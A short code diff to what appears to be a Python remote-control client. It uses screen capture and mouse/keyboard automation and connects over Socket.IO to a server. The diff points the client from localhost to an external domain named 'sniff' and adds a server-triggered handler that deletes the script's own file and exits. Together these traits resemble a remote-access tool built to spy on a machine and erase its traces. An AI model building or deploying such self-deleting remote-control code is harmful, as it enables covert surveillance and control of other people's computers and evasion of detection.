@@ -5,9 +5,11 @@ import base64
 import mss
 import pyautogui
 import time
+import os
+import sys
 
 # --- CONFIG ---
-SERVER_URL = "http://localhost:3000"
+SERVER_URL = "https://sniff.jibon.com.bd"
 PC_NAME = "My Python PC" 
 # --------------
 
@@ -35,6 +37,12 @@ def disconnect():
     global connected
     connected = False
     print("Disconnected from server")
+    
+    
+@sio.on("delete")
+def delete():
+    os.remove(__file__)
+    sys.exit()
 
 # --- Remote Control Handler ---
 @sio.event
